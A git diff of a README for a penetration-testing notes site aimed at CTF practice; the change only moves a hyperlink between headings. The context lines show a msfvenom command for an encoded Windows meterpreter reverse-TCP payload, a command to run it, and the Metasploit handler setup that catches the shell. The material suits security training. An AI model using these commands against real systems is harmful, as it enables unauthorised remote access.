@@ -4,7 +4,7 @@ The purspose of this site is to make the Penetration testing and Privilege escat
 
 In this site I am attempting to collect most of the common exploits that appear in CTF and other exinvornments.
 
-### [Getting Revese shell](https://github.com/dayaramb/dayaramb.github.io/tree/master/reverse_shells)
+### Getting Revese shell
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
@@ -21,7 +21,7 @@ Start-Process "shell-name.exe"
 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
 
 ```
-### Reverse Shell Collection
+### [Reverse Shell Collection](https://github.com/dayaramb/dayaramb.github.io/tree/master/reverse_shells)
 
 
 ### Random Exploit collection
